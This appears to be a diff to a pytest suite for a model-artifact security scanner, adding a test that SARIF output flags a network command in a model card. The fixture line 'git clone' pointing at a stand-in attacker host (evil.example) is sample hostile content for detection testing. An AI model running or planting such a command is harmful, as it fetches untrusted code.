@@ -2,11 +2,13 @@
 
 import json
 import time
+from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
 
 import modelaudit.integrations.sarif_formatter as sarif_formatter
+from modelaudit.core import scan_model_directory_or_file
 from modelaudit.models import AssetModel, FileHashesModel, FileMetadataModel, create_initial_audit_result
 from modelaudit.scanners.base import Issue, IssueSeverity
 
@@ -676,6 +678,25 @@ class TestCreateResults:
         results = _create_results([issue])
 
         assert results[0]["partialFingerprints"]["primaryLocationLineHash"] == "text-doc-network:stable"
+
+    def test_result_preserves_model_card_evidence_fingerprint_and_region(self, tmp_path: Path) -> None:
+        text_path = tmp_path / "model_card.md"
+        text_path.write_text("git clone https://evil.example/repo.git\n", encoding="utf-8")
+
+        result = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+        output = format_sarif_output(result, [str(text_path)])
+        sarif_result = json.loads(output)["runs"][0]["results"][0]
+
+        assert sarif_result["message"]["text"] == "Git clone network command detected: https://evil.example/repo.git"
+        assert sarif_result["partialFingerprints"]["primaryLocationLineHash"].startswith("text-doc-network:")
+        assert sarif_result["properties"]["normalized_evidence"] == {
+            "kind": "url",
+            "value": "https://evil.example/repo.git",
+        }
+        assert sarif_result["locations"][0]["physicalLocation"]["region"] == {
+            "startLine": 1,
+            "startColumn": len("git clone ") + 1,
+        }
 
     def test_result_kind_by_severity(self):
         """Test result kind based on severity."""
